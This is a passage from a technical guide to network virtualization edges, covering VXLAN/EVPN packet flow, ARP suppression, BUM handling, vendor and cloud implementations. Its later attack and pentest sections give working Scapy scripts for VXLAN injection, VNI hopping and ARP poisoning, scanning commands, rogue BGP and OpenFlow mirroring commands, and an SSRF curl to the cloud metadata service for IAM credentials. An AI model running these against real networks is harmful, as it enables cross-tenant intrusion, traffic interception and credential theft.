  │ Payload: TCP/UDP data...                                 │
  └──────────────────────────────────────────────────────────┘

STEP 4: Packet traverses underlay IP network
  Routers only see outer headers (Src=1.1.1.1, Dst=2.2.2.2)
  Inner tenant frame is completely opaque to underlay

STEP 5: Packet arrives at Host-2's physical NIC

STEP 6: NVE-B (Host-2's vSwitch/VTEP) receives it
  Sees UDP Dst=4789 → VXLAN packet
  Validates I flag is set
  Extracts VNI=10100 → maps to local bridge/vSwitch for tenant VNI 10100
  Strips outer ETH+IP+UDP+VXLAN headers
  Delivers inner frame [Src=AA:AA, Dst=BB:BB] to local bridge

STEP 7: Local bridge on Host-2 looks up Dst MAC=BB:BB
  → VM-B is local, deliver directly
  VM-B receives the frame as if it came from VM-A on the same L2 switch
```

### 9.2 Packet Walk: Cross-VNI Routing (Asymmetric IRB)

Inter-tenant routing (VM-A in VNI 10100 → VM-X in VNI 20200):

#### Asymmetric IRB (older approach)
```
"Asymmetric" because ingress NVE does all the routing work,
 egress NVE just does bridging.

NVE-A config:
  VNI 10100 → SVI-10100: 10.1.1.254/24 (default GW for VNI 10100)
  VNI 20200 → SVI-20200: 10.2.2.254/24 (must have ALL subnets)

Packet flow:
1. VM-A sends to 10.2.2.1 (in VNI 20200)
2. VM-A uses 10.1.1.254 as default gateway (ARP for GW MAC)
3. NVE-A's SVI for VNI 10100 receives the packet
4. NVE-A does routing lookup: 10.2.2.1 → in SVI-20200 on this NVE
5. NVE-A ARPs for 10.2.2.1 within VNI 20200
6. NVE-A finds 10.2.2.1 is at VTEP 2.2.2.2 (via EVPN)
7. NVE-A encapsulates with VNI=20200 (NOT 10100!)
8. NVE-B receives, decapsulates VNI=20200, delivers to VM-X

Problem: NVE-A must have ALL subnets configured locally
  → doesn't scale; every NVE must know all tenant subnets
```

#### Symmetric IRB (modern approach)
```
"Symmetric" because both ingress AND egress NVE do routing.
  → Each NVE only needs its local subnets
  → Uses a dedicated L3 VNI per tenant (VRF)

NVE-A config:
  VNI 10100: L2 VNI for subnet 10.1.1.0/24
  VNI 50000: L3 VNI for tenant VRF "TENANT-A" ← this is the key addition

Packet flow:
1. VM-A sends to 10.2.2.1 (different subnet, same tenant)
2. VM-A ARP for 10.1.1.254 (anycast GW MAC, same on all NVEs)
3. NVE-A routes: dst 10.2.2.1 → in IP-VRF TENANT-A
4. NVE-A looks up 10.2.2.1 → EVPN Type-5 route → VTEP 2.2.2.2
5. NVE-A encapsulates with:
   - VNI = 50000 (the L3 VNI for TENANT-A VRF)
   - Inner MAC = Router MAC of NVE-B (learned via EVPN Extended Community)
6. NVE-B receives packet:
   - Sees VNI=50000 → L3 VNI → go to IP-VRF TENANT-A
   - Does routing lookup: 10.2.2.1 → in local VNI 20200
   - Bridges to VM-X in VNI 20200

Result: NVE-A only needs to know subnet 10.1.1.0/24 locally
        NVE-B only needs to know subnet 10.2.2.0/24 locally
        L3 routing is distributed across all NVEs
```

---

## 10. ARP Suppression and Proxy ARP

### 10.1 Why ARP is a Problem in Overlays

In a large VNI with 10,000 VMs, if every VM sends ARP requests normally:
- Each ARP broadcast must be flooded to all VTEPs in the VNI
- 10,000 VMs × frequent ARP = massive BUM traffic
- Wastes bandwidth, wastes CPU on all VTEPs

### 10.2 ARP Suppression via BGP-EVPN

BGP-EVPN Type-2 routes carry both MAC and IP together. The NVE can build a complete MAC-IP binding table from these routes — a local "ARP cache" for the entire overlay.

```
ARP Suppression Flow:
VM-A sends: ARP Request "Who has 10.1.1.2? Tell AA:AA"
                │
                ▼
          NVE-A intercepts the ARP request
          NVE-A checks its local EVPN-derived ARP table
          "10.1.1.2 → BB:BB, VTEP=2.2.2.2" → FOUND!
                │
                ▼
          NVE-A generates an ARP Reply on behalf of VM-B
          "10.1.1.2 is at BB:BB" → sent directly to VM-A
                │
          ARP request NEVER leaves the local NVE
          VTEP-2.2.2.2 never sees this ARP
          Zero BUM traffic generated
```

### 10.3 ND (Neighbor Discovery) Suppression for IPv6

Same concept for IPv6. BGP-EVPN Type-2 routes carry IPv6 addresses too. NVE intercepts NS (Neighbor Solicitation) messages and responds with NA (Neighbor Advertisement) from its local binding table.

### 10.4 Gratuitous ARP / VM Migration

When a VM migrates (vMotion):
1. VM moves from Host-1 to Host-2 (same IP, same MAC)
2. New NVE (Host-2) sends EVPN Type-2 route update with:
   - Same MAC/IP
   - New Next-Hop (VTEP=2.2.2.2)
   - Higher sequence number
3. All NVEs update their MAC-IP tables to point to the new VTEP
4. Old NVE flushes its local binding for that MAC/IP
5. Traffic follows VM to new host instantly

---

## 11. BUM Traffic Handling

### 11.1 What is BUM Traffic

BUM = **Broadcast, Unknown unicast, Multicast**

- **Broadcast:** ARP requests, DHCP discovers, etc.
- **Unknown unicast:** Destination MAC not in FDB (must flood)
- **Multicast:** Layer 2 multicast/broadcast (e.g., mDNS, OSPF hellos)

This traffic cannot be suppressed 100% (only partially via ARP suppression), so NVE must handle it.

### 11.2 Three Methods for BUM Traffic

#### Method 1: Ingress Replication / Head-End Replication (HER)
```
NVE-A has a BUM frame for VNI 10100.
NVE-A knows all other VTEPs in VNI 10100 (from EVPN Type-3 routes).
NVE-A makes N copies and sends unicast VXLAN to each VTEP.

NVE-A ──VXLAN unicast──→ NVE-B (copy 1)
NVE-A ──VXLAN unicast──→ NVE-C (copy 2)
NVE-A ──VXLAN unicast──→ NVE-D (copy 3)

Pro: No multicast required in underlay (works with any IP underlay)
Con: NVE-A CPU must replicate N times; N packets sent from NVE-A
     Scales poorly with many VTEPs per VNI
```

#### Method 2: Multicast Underlay
```
Each VNI is mapped to a multicast group in the underlay.
NVE-A sends ONE multicast packet to the group.
Underlay multicast tree (PIM-SSM or PIM-ASM) replicates.

NVE-A → sends to 239.1.1.1 (multicast group for VNI 10100)
               │
        Underlay multicast tree
         /        |        \
      NVE-B     NVE-C     NVE-D
      (all subscribed to 239.1.1.1)

Pro: Efficient underlay replication; NVE-A sends only once
Con: Requires multicast in underlay (PIM, IGMP snooping)
     Operational complexity; many clouds don't support underlay multicast
```

#### Method 3: Assisted Replication (AR) / EVPN Multicast
```
A designated "replicator" NVE handles BUM replication on behalf of others.
Sometimes called "proxy replication" or used with EVPN BUM procedures.

NVE-A → sends to Replicator NVE
Replicator → replicates to all other NVEs

Reduces load on sender while avoiding full underlay multicast.
Used in some SP-grade EVPN deployments.
```

### 11.3 EVPN Type-3 Route (IMET) and HER List

The HER list (which VTEPs to replicate BUM to for a given VNI) is built from **EVPN Type-3 (IMET)** routes:

```
Every NVE that participates in VNI 10100 advertises a Type-3 route:
  Route Type = 3
  RD = 1.1.1.1:10100
  EtherTag = 0
  IP = 1.1.1.1 (the advertising NVE's VTEP IP)
  Extended Community: RT=65000:10100, PMSI (P-Multicast Service Interface)

NVE-A imports all Type-3 routes for VNI 10100.
NVE-A builds HER list = {1.1.1.1, 2.2.2.2, 3.3.3.3} (all VTEPs for VNI 10100)
For BUM: NVE-A unicasts VXLAN to each IP in HER list.
```

---

## 12. Distributed Anycast Gateway

### 12.1 The Gateway Problem

Traditionally, a subnet's default gateway is one specific device (router or firewall). If VM-A is at rack 1 and its gateway is at rack 20, all VM-A traffic must traverse to rack 20 before reaching the fabric — a **traffic trombone**.

### 12.2 Anycast Gateway Solution

Every NVE (every rack, every host) presents itself as the default gateway for every tenant subnet it serves, using the **same IP and same MAC address**. This is the distributed anycast gateway.

```
VM-A: 10.1.1.1/24, GW=10.1.1.254
VM-B: 10.1.1.2/24, GW=10.1.1.254

On Host-1 NVE: SVI VNI-10100 = 10.1.1.254, MAC=00:00:11:11:11:11
On Host-2 NVE: SVI VNI-10100 = 10.1.1.254, MAC=00:00:11:11:11:11
On Host-3 NVE: SVI VNI-10100 = 10.1.1.254, MAC=00:00:11:11:11:11
                                             ↑ ALL SAME!

VM-A ARPs for 10.1.1.254 → local NVE responds (no round-trip needed)
VM-A sends default-GW traffic → local NVE routes it → sends directly
                                                    to destination NVE

Traffic never "trampolines" to a central router!
```

### 12.3 Router MAC Extended Community

For symmetric IRB to work, NVEs must know each other's router MAC (used as inner destination MAC for routed VXLAN packets). This is advertised via the **EVPN Router's MAC Extended Community** in Type-2 and Type-5 routes.

```
When NVE-A sends a routed VXLAN packet to NVE-B:
  Inner Dst MAC = NVE-B's Router MAC (learned via EVPN)
  Inner Src MAC = NVE-A's Router MAC
  VNI = L3 VNI (not the L2 VNI of source subnet)

NVE-B sees its own Router MAC as inner Dst MAC → knows this is L3
NVE-B does routing lookup in IP-VRF → delivers to local VM
```

---

## 13. Multi-Tenancy and VNI Design

### 13.1 VNI Allocation Models

#### Flat VNI Model
```
One VNI per tenant subnet.
Tenant A, Subnet 1:  VNI 10001
Tenant A, Subnet 2:  VNI 10002
Tenant B, Subnet 1:  VNI 20001
Tenant B, Subnet 2:  VNI 20002

Simple. No L3 VNI needed (asymmetric IRB).
Doesn't scale when tenants have many subnets.
```

#### VNI with L3 VNI (Symmetric IRB model)
```
Each tenant gets:
  - One L2 VNI per subnet (for bridging)
  - One L3 VNI per tenant VRF (for routing between subnets)

Tenant A:
  L2 VNI 10001: subnet 10.0.1.0/24
  L2 VNI 10002: subnet 10.0.2.0/24
  L3 VNI 50001: VRF for Tenant A (routing between above subnets)

Tenant B:
  L2 VNI 20001: subnet 172.16.1.0/24
  L3 VNI 50002: VRF for Tenant B

Traffic within Tenant A between subnets:
  Uses L2 VNI for local bridging
  Uses L3 VNI=50001 for routed VXLAN between NVEs
```

### 13.2 VRF-to-VNI Mapping

```
┌──────────────────────────────────────────────────────────┐
│  NVE Configuration (Cisco NX-OS example concept)         │
│                                                          │
│  vrf context TENANT-A                                    │
│    vni 50001                    ← L3 VNI for this VRF    │
│    rd auto                                               │
│    address-family ipv4 unicast                           │
│      route-target import 65000:50001                     │
│      route-target export 65000:50001                     │
│                                                          │
│  vlan 101                                                │
│    vn-segment 10001             ← maps VLAN to L2 VNI   │
│                                                          │
│  interface nve1                 ← the NVE interface      │
│    no shutdown                                           │
│    source-interface loopback0   ← VTEP IP = lo0 IP       │
│    member vni 10001             ← L2 VNI                 │
│      mcast-group 239.1.1.1      ← BUM multicast group    │
│    member vni 50001 associate-vrf  ← L3 VNI for routing  │
└──────────────────────────────────────────────────────────┘
```

### 13.3 Tenant Isolation Guarantees

- **L2 isolation:** VNI tag in VXLAN header → frames from one VNI never delivered to another
- **L3 isolation:** VRF separation → routes from one tenant's VRF never leak to another
- **Security concern:** VNI isolation is only enforced by the NVE software/ASIC. If an attacker controls an NVE endpoint or can forge VXLAN packets, they can potentially inject frames into any VNI.

---

## 14. NVE in Real Vendor Implementations

### 14.1 Cisco (NX-OS VXLAN-EVPN)

Used in Cisco ACI (Application Centric Infrastructure) and standard VXLAN-EVPN deployments on Nexus switches.

Key concepts:
- **Loopback interface** as VTEP IP (stable, survives link failures)
- **NVE interface** (nve1) — the logical encap/decap entity
- **BGP with EVPN address-family** for control plane
- **VPC (Virtual Port Channel)** for multihoming — two switches act as one VTEP with shared anycast IP

```
Cisco NX-OS VXLAN-EVPN Packet Flow:
  VM → vNIC → NX-OS vSwitch (NVE in software) → physical NIC
    OR
  VM → physical NIC → ToR Nexus switch (NVE in ASIC) → uplinks
```

### 14.2 Arista EOS (VXLAN-EVPN)

Arista uses EVPN with a slightly different CLI but same principles. Key differentiator: Arista's **MLAG** (Multi-chassis Link Aggregation) for dual-homing NVEs.

### 14.3 VMware NSX-T

VMware NSX-T uses **GENEVE** (not VXLAN) as the data plane encapsulation (switched from VXLAN-based NSX-V). 

```
NSX-T Architecture:
  ┌─────────────────────────────────────────────────────────┐
  │  NSX Manager (centralized control/mgmt plane)           │
  │  - Distributed to 3 nodes for HA                        │
  │  - Pushes config to all transport nodes                 │
  ├─────────────────────────────────────────────────────────┤
  │  NSX Controller (embedded in Manager in NSX-T 3.x)      │
  │  - Used to be separate; now part of Manager cluster     │
  ├─────────────────────────────────────────────────────────┤
  │  Transport Nodes (ESXi, KVM, bare-metal, Edge VMs)      │
  │  Each runs:                                             │
  │    - N-VDS (NSX Virtual Distributed Switch)             │
  │    - NSX TEP (Tunnel End Point) = NVE implementation    │
  │    - Geneve encap/decap in kernel                       │
  ├─────────────────────────────────────────────────────────┤
  │  NSX Edge Nodes                                         │
  │  - Handle N-S (North-South) traffic: internet, VPN      │
  │  - Run in VMs or bare-metal                             │
  │  - BGP with upstream physical routers                   │
  └─────────────────────────────────────────────────────────┘
```

NSX-T control plane uses a **proprietary distributed control plane** (not BGP-EVPN by default for intra-fabric), though it can do BGP-EVPN to physical fabric.

### 14.4 Open vSwitch (OVS) — The Linux Implementation

OVS is the dominant open-source virtual switch, used in:
- OpenStack (Neutron)
- Kubernetes (as OVN — Open Virtual Network)
- KVM hypervisors

OVS supports VXLAN, GENEVE, GRE, STT encapsulation. The NVE is implemented in the OVS kernel module (for performance) with a user-space controller (ovs-vswitchd).

```
OVS Architecture:
  ┌────────────────────────────────────────────────────────┐
  │  ovs-vsctl / ovs-ofctl (management tools)             │
  ├────────────────────────────────────────────────────────┤
  │  ovs-vswitchd (user-space daemon)                     │
  │  - Processes complex flows, controller connection      │
  │  - OpenFlow protocol support                           │
  ├────────────────────────────────────────────────────────┤
  │  ovsdb-server (config database)                       │
  ├────────────────────────────────────────────────────────┤
  │  OVS Kernel Module (openvswitch.ko)                   │
  │  - Fast path: handles cached flows in kernel           │
  │  - Encap/decap for VXLAN/GENEVE in kernel             │
  └────────────────────────────────────────────────────────┘

VXLAN tunnel creation in OVS:
  ovs-vsctl add-port br0 vxlan0 \
    -- set interface vxlan0 type=vxlan \
    options:remote_ip=2.2.2.2 \
    options:key=10100          ← VNI
```

### 14.5 OVN — Open Virtual Network

OVN is a higher-level abstraction on top of OVS, providing:
- Logical switches and routers
- Distributed routing (every hypervisor is a router)
- Security groups (ACLs)
- Load balancing
- BGP peer integration

OVN translates logical network policies into OpenFlow rules on each OVS instance. Used by Kubernetes (with OVN-Kubernetes CNI).

---

## 15. NVE in Cloud Platforms

### 15.1 AWS — The Nitro System

AWS reinvented its hypervisor with the **Nitro System**. Every EC2 instance runs on a physical host where the NVE is implemented in dedicated hardware:

```
AWS Nitro Architecture:
  ┌─────────────────────────────────────────────────────────┐
  │  Physical Server (AWS Host)                             │
  │  ┌─────────────────────────────────────────────────────┐│
  │  │  Guest EC2 instances                                ││
  │  │  (cannot access hypervisor or NVE internals)        ││
  │  └─────────────────────────────────────────────────────┘│
  │  ┌─────────────────────────────────────────────────────┐│
  │  │  Nitro Hypervisor (lightweight KVM-based)           ││
  │  │  Only does CPU/memory virtualization                ││
  │  └─────────────────────────────────────────────────────┘│
  │  ┌─────────────────────────────────────────────────────┐│
  │  │  Nitro Card (custom ASIC / Smart NIC)               ││
  │  │  - Handles ALL network I/O                          ││
  │  │  - GENEVE encap/decap at hardware speed             ││
  │  │  - Security group enforcement in hardware           ││
  │  │  - EBS (storage) offload                           ││
  │  │  - Instance metadata service                        ││
  │  └─────────────────────────────────────────────────────┘│
  └─────────────────────────────────────────────────────────┘
```

AWS VPC uses a **mapping service** (proprietary control plane) that distributes MAC-to-overlay IP mappings. When EC2 instance sends a packet:
1. Nitro card intercepts
2. Looks up destination in local mapping table
3. Encapsulates with GENEVE (with custom AWS TLVs)
4. Sends over the AWS physical network

### 15.2 Azure — Virtual Filtering Platform (VFP)

Azure uses a system called **VFP (Virtual Filtering Platform)** — a programmable vSwitch built on top of a custom NVE.

```
Azure VFP:
  - Lives in the host OS (not in the guest VM)
  - Policy enforcement at VFP, not in VM
  - Uses NVGRE (historically) and VXLAN/GRE hybrid
  - Azure SDN policy pushed to VFP via Azure fabric controller
  - SmartNIC (Azure SmartNIC) offloads VFP rules to hardware

Azure SmartNIC (Project Catapult):
  - FPGA-based NIC
  - Processes network rules (ACL, NAT, load balancing) in FPGA
  - Zero impact on VM CPU
```

### 15.3 Google Cloud — Andromeda

Google Cloud uses **Andromeda** as its virtual network stack. Andromeda provides:
- Virtual networking (VPC)
- Distributed load balancing
- Cloud Firewall
- Flow-based packet processing

Google's physical network (**Jupiter**) is a custom Clos fabric with custom ASICs (Pluto, Orion). The NVE encapsulation happens at the host level in the Andromeda software stack, which has been progressively offloaded to SmartNICs (**Titanium**).

### 15.4 VPC — What It Actually Is (All Clouds)

A Virtual Private Cloud (VPC) **is** an NVE overlay network, abstracted into a cloud service:

```
VPC = L3 overlay network built on NVE technology
│
├── Subnets = L2 VNI segments (different availability zones)
├── Route tables = per-VRF routing tables at the NVE
├── Security Groups = per-flow ACLs enforced at the NVE
├── Internet Gateway = NAT function at the border NVE
├── VPC Peering = L3 route sharing between two NVE-backed VRFs
└── Transit Gateway = centralized routing between many VPCs
```

---

## 16. NVE Security Architecture

### 16.1 Trust Model

NVE assumes the underlay is **untrusted** and the overlay segments are **isolated from each other by design**. The security model:

```
Tenant VM ──trusts──→ Local NVE (vSwitch/VTEP)
Local NVE ──trusts──→ Remote NVE (peer VTEP)
Remote NVE ──trusts──→ Tenant frames with correct VNI

PROBLEM: This trust is based on:
  1. IP address of the source VTEP (outer src IP in VXLAN)
  2. VNI in the VXLAN header
  Both are completely unauthenticated in standard VXLAN!
```

### 16.2 VXLAN Has No Authentication

This is the most critical security fact about VXLAN:

**RFC 7348 explicitly states:**
> "VXLAN does not provide any form of authentication or encryption of the traffic."

There is no:
- Packet authentication (no HMAC)
- Encryption (no TLS/IPsec built-in)
- Source VTEP verification (no certificate/PSK)

Any host that can send UDP packets to port 4789 at a VTEP can inject VXLAN-encapsulated frames into any VNI.

### 16.3 NVE Security Controls (What Should Exist)

#### Underlay ACLs
```
Restrict UDP/4789 traffic to only known VTEP IPs:
  permit udp <known-vtep-range> any eq 4789
  deny   udp any any eq 4789

This prevents external attackers from injecting VXLAN packets.
```

#### IPsec Tunnel Authentication/Encryption
Some NVE implementations support IPsec between VTEPs:
```
NVE-A ←─────IPsec ESP─────→ NVE-B
  Inner: VXLAN-encapsulated tenant frames
  Outer: IPsec encrypted and authenticated

Provides:
  - Authentication (IKE/PSK/certificates)
  - Encryption (AES-GCM)
  - Anti-replay protection
```

#### MACsec (Layer 2 Security)
Used for point-to-point link encryption in the underlay. Does not protect the overlay directly.

#### Microsegmentation via Security Groups
NVEs can enforce per-VM/per-flow ACLs:
```
Security Group on NVE:
  Allow: TCP 10.1.1.0/24 → 10.1.2.5 port 443
  Deny:  All other traffic to 10.1.2.5

Enforced at ingress AND egress of each NVE
Stateful (connection tracking in NVE)
```

---

## 17. Attack Surface and Exploitation Techniques

### 17.1 VXLAN Injection Attack

**What it is:** An attacker sends crafted VXLAN-encapsulated frames to a VTEP to inject traffic into a target VNI.

**Precondition:** Attacker can reach UDP port 4789 on a VTEP (e.g., attacker is on the same underlay network, or firewall allows it).

```python
# VXLAN injection using Scapy
from scapy.all import *
from scapy.contrib.vxlan import VXLAN

# Target: inject a packet into VNI 10100
# Outer packet: attacker → target VTEP
# Inner packet: spoofed tenant frame

packet = (
    Ether() /
    IP(src="<attacker_IP>", dst="<target_VTEP_IP>") /
    UDP(sport=RandShort(), dport=4789) /
    VXLAN(vni=10100, flags=0x08) /
    Ether(src="<spoofed_inner_src_MAC>", dst="<target_inner_MAC>") /
    IP(src="10.1.1.99", dst="10.1.1.1") /  # spoofed tenant IP
    TCP(dport=80) /
    Raw(b"GET / HTTP/1.1\r\nHost: target\r\n\r\n")
)

sendp(packet, iface="eth0", verbose=True)
```

**Impact:**
- Inject traffic into any VNI (if VTEP has no ACLs)
- ARP poisoning within a VNI
- Man-in-the-Middle within a tenant segment
- Cross-tenant data exfiltration

### 17.2 VNI Hopping / Cross-Tenant Injection

**What it is:** Change the VNI in the VXLAN header to target a different tenant's segment.

```python
# VNI hopping — try all VNIs to find active segments
from scapy.all import *
from scapy.contrib.vxlan import VXLAN

target_vtep = "192.168.1.100"

for vni in range(1, 16777215):  # all possible VNIs
    pkt = (
        IP(dst=target_vtep) /
        UDP(dport=4789) /
        VXLAN(vni=vni, flags=0x08) /
        Ether() /
        ARP(op="who-has", pdst="10.0.0.1")  # ARP probe inside VNI
    )
    # Send and listen for VXLAN response (indicates active VNI)
    send(pkt, verbose=0)
```

**Detection:** Monitor VTEP for unexpected source IPs sending VXLAN; log/alert on ARP responses in unexpected VNIs.

### 17.3 VTEP Discovery and Enumeration

**Active VTEP Discovery:**
```bash
# Find VTEP endpoints by scanning for UDP/4789 listeners
nmap -sU -p 4789 <target_range>

# Use masscan for speed
masscan <target_range> -p U:4789 --rate=1000

# Verify VTEP with a minimal VXLAN probe (I-flag=1, VNI=1)
# A real VTEP will silently drop invalid frames; an open UDP port confirms listener
```

**Passive VTEP Discovery:**
```bash
# On the underlay network, capture VXLAN traffic
tcpdump -i eth0 -n 'udp port 4789' -w vxlan_capture.pcap

# Analyze with tshark
tshark -r vxlan_capture.pcap -Y vxlan -T fields \
  -e ip.src -e ip.dst -e vxlan.vni

# Extract all unique VTEPs and VNIs
tshark -r vxlan_capture.pcap -Y vxlan -T fields \
  -e ip.src -e ip.dst -e vxlan.vni | sort -u
```

### 17.4 Inner Frame Analysis / Tenant Traffic Interception

If an attacker compromises a VTEP (e.g., compromised hypervisor), they can:
- Capture all traffic for all VNIs on that NVE
- Inject traffic into any local VM's network path
- Sniff unencrypted tenant traffic

```bash
# On compromised host, capture all VXLAN and decode inner frames
tcpdump -i eth0 -n 'udp port 4789' | \
  # Inner frame starts at offset: 14(outer ETH)+20(IP)+8(UDP)+8(VXLAN)=50 bytes from start
  # Or use VXLAN-aware tools:

# tshark with VXLAN inner frame decoding
tshark -i eth0 -Y vxlan -d 'udp.port==4789,vxlan' -T json

# Wireshark on CLI for deep inspection
dumpcap -i eth0 -f 'udp port 4789' -w - | wireshark -k -i -
```

### 17.5 ARP Poisoning within a VNI

If an attacker has a legitimate VM in a shared VNI (e.g., in a compromised multi-tenant environment):

```python
from scapy.all import *
from scapy.contrib.vxlan import VXLAN

# Send gratuitous ARP inside a VNI to poison other VMs' ARP caches
# Attacker's VM is in VNI 10100, wants to MITM traffic to GW 10.1.1.254

# If attacker can send raw VXLAN (from outside the VNI):
garp = (
    IP(dst="<target_vtep>") /
    UDP(dport=4789) /
    VXLAN(vni=10100, flags=0x08) /
    Ether(src="<attacker_mac>", dst="ff:ff:ff:ff:ff:ff") /
    ARP(
        op=2,                          # is-at (reply)
        hwsrc="<attacker_mac>",
        psrc="10.1.1.254",             # claiming to be the gateway!
        hwdst="ff:ff:ff:ff:ff:ff",
        pdst="10.1.1.0"
    )
)
sendp(garp, iface="eth0", count=5)
```

**Impact:** ARP poisoning succeeds → MITM all traffic to the gateway within the VNI.

### 17.6 BGP-EVPN Attacks

If an attacker can establish a BGP-EVPN session (e.g., rogue NVE, BGP route injection):

```
Attack 1: MAC/IP Hijacking
  Advertise EVPN Type-2 route with:
    - Victim VM's MAC/IP
    - Attacker's VTEP IP as Next-Hop
  Result: All NVEs redirect traffic for victim to attacker's VTEP

Attack 2: Route Injection via Type-5
  Inject EVPN Type-5 (IP Prefix) route for 0.0.0.0/0:
  → Default route hijacking across all VRFs that import the RT
  → All traffic redirected through attacker's VTEP

Attack 3: VNI Exhaustion / BGP Table Overflow
  Advertise millions of MAC/IP routes → consume memory on all NVEs
  → Denial of Service / FDB table overflow
```

**Prerequisites for BGP attacks:**
- Attacker must establish a BGP session (requires TCP/179 reachability and potentially BGP password)
- More likely in misconfigured environments with open BGP or in internal network penetration

### 17.7 Cloud NVE-Specific Attacks

#### SSRF via Cloud Metadata + NVE
```
In cloud environments (AWS/Azure/GCP), the Instance Metadata Service
(IMDS) is reachable at 169.254.169.254.
This IP is handled by the NVE/hypervisor, not by a real server.

If you find SSRF in an EC2 app:
  → curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
  → NVE intercepts, returns IAM credentials
  → This is an NVE-level service, not a network-level one

IMDS v1 (IMDSv1) has no authentication:
  → Any process on the instance can get credentials
  → SSRF can reach it from a web app

IMDS v2 (IMDSv2) requires a token:
  → PUT http://169.254.169.254/latest/api/token (with TTL header)
  → Then GET with X-aws-ec2-metadata-token header
  → SSRF bypass: if PUT is followed by GET via SSRF, can still work
```

#### VPC Security Group Bypass
```
Security Groups on AWS/Azure are enforced at the NVE (hypervisor level).
Attack scenarios:
  1. If two ENIs (Elastic Network Interfaces) are on same physical host
     → traffic may bypass security groups (historically patched but check for new instances)
  2. VPC peering misconfigurations → routes leak between VPCs
  3. Transit Gateway route table misconfigurations → cross-account access
```

#### Subnet Route Table Poisoning (Cloud)
```
Cloud route tables are managed by the cloud control plane.
Attack surface:
  - IAM misconfiguration → attacker can modify VPC route tables
  - Add route: 0.0.0.0/0 → attacker-controlled instance
  - Traffic from other instances in subnet → all routed to attacker
  Tools: AWS CLI, Pacu (AWS exploitation framework)
```

---

## 18. NVE Misconfigurations — Bug Bounty and Pentest

### 18.1 VXLAN Open to Internet

**Finding:** NVE/VTEP listening on UDP/4789 accessible from the internet.

```bash
# Detection
nmap -sU -p 4789 <target_IP>
# If open → send VXLAN probe
python3 -c "
import socket
# VXLAN I-flag header + ARP inner frame
pkt = b'\x08\x00\x00\x00' + b'\x00\x00\x64\x00'  # VNI=100
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(pkt, ('<target_IP>', 4789))
"
```

**Impact:** Critical. Allows VNI injection, tenant isolation bypass.
**Remediation:** Firewall rule — only allow VTEP-to-VTEP UDP/4789.

### 18.2 GENEVE Open (UDP/6081)

Same issue for GENEVE. Check for UDP/6081 open to external networks.

```bash
nmap -sU -p 6081 <target>
```

### 18.3 Exposed BGP EVPN

**Finding:** TCP/179 (BGP) reachable without password or with weak MD5.

```bash
# Check if BGP port is open
nmap -p 179 <spine_switch_IP>

# Try BGP session (bgpdump or bgpscanner)
# gobgp for testing
gobgp neighbor add <target> as 65000 router-id <your_IP>

# If BGP opens → dump all EVPN routes
# → see all tenant MAC/IP/prefix data = information disclosure
```

**Impact:** High. Full network topology and tenant MAC/IP disclosure. Potential route injection.

### 18.4 Unconfigured VTEP Source Checking

Some NVE implementations don't validate that the outer source IP matches a known VTEP list. This allows VXLAN injection from arbitrary sources.

```bash
# Test: send VXLAN from unexpected source IP
# If inner frame is delivered → no source VTEP validation

hping3 --udp -p 4789 <target_vtep> \
  --data "0800000000006400<inner_frame_hex>"
```

### 18.5 Default VNI 0 Accessible

Some implementations have VNI 0 (or VNI 1) as a default/management network. Sending frames to VNI 0 may reach management infrastructure.

### 18.6 MTU Misconfiguration Leading to Fragmentation

VXLAN adds 50+ bytes of overhead. If the underlay MTU is not properly set (≥1550 for standard, or ≥9000 for jumbo):

- Large packets get fragmented in the underlay
- Fragmented VXLAN packets may bypass security controls (some firewalls don't reassemble before inspection)
- Can be used for firewall evasion

```bash
# Test MTU path for VXLAN overlay
ping -M do -s 1400 <remote_VM_IP>   # -M do = don't fragment
# Vary size from 1400 to 1472 to find MTU drop point
```

### 18.7 OVS Flow Rule Injection (OpenFlow Misconfig)

If an attacker can reach the OpenFlow controller port (TCP/6633 or TCP/6653):

```bash
# Check for open OpenFlow controller
nmap -p 6633,6653 <controller_IP>

# If accessible without auth:
# Install flow rule that mirrors all traffic to attacker
ovs-ofctl -O OpenFlow13 add-flow <bridge> \
  "priority=65535,actions=output:1,output:2"  # mirror to port 2
```

**Impact:** Critical. Full traffic capture for all VMs on that OVS bridge.

---

## 19. Packet Captures and Forensics

### 19.1 Capturing VXLAN Traffic

```bash
# Capture VXLAN on VTEP interface
tcpdump -i eth0 -n 'udp port 4789' -w vxlan.pcap

# Capture and immediately decode inner frames with tshark
tshark -i eth0 \
  -d 'udp.port==4789,vxlan' \
  -Y 'vxlan' \
  -T fields \
  -e ip.src \
  -e ip.dst \
  -e vxlan.vni \
  -e eth.src \
  -e eth.dst \
  -e ip.inner.src \
  -e ip.inner.dst

# Decode GENEVE traffic (UDP/6081)
tshark -i eth0 \
  -d 'udp.port==6081,geneve' \
  -Y 'geneve'
```

### 19.2 Extracting Inner Frames from PCAP

```python
from scapy.all import rdpcap
from scapy.contrib.vxlan import VXLAN

pkts = rdpcap("vxlan.pcap")
for pkt in pkts:
    if VXLAN in pkt:
        vni = pkt[VXLAN].vni
        inner = pkt[VXLAN].payload  # inner Ethernet frame
        print(f"VNI={vni}: {inner.summary()}")
        # Write inner frames to new pcap for analysis
        # wrpcap("inner_frames.pcap", inner)
```

### 19.3 Analyzing BGP-EVPN Traffic

```bash
# Capture BGP traffic
tcpdump -i eth0 -n 'tcp port 179' -w bgp.pcap

# Decode with tshark — EVPN routes visible in plain text if no TLS
tshark -r bgp.pcap -Y bgp -T json | python3 -m json.tool | grep -A5 "evpn"

# Use bgpdump for offline BGP MRT dump analysis
bgpdump -m bgp_mrt_dump.mrt | grep "EVPN"
```

### 19.4 Finding VTEP IPs from Captured Traffic

```bash
# Extract all unique VTEP pairs from VXLAN capture
tshark -r vxlan.pcap -Y vxlan -T fields -e ip.src -e ip.dst -e vxlan.vni \
  | awk '!seen[$0]++' \
  | sort -t$'\t' -k3 -n  # sort by VNI
```

---

## 20. Mental Model Summary

### 20.1 The Core Abstraction

```
NVE = "a virtual wire factory"
  → Takes tenant Ethernet frames as input
  → Wraps them in UDP/IP (the outer packet)
  → Ships them across the physical network
  → Unwraps at the destination
  → Delivers as if they traveled on a real wire

VNI = the "circuit ID" on the virtual wire
  → 24 bits = 16 million virtual circuits on one physical network
  → Complete isolation between VNIs (enforced by NVE)
```

### 20.2 The Three Key Questions for Any NVE System

1. **Where is the destination?**
   → Answered by BGP-EVPN control plane (which VTEP IP hosts that MAC/IP?)

2. **How do I send there?**
   → Answered by VXLAN/GENEVE data plane (encapsulate with outer IP = remote VTEP IP, VNI = tenant segment)

3. **What about BUM traffic?**
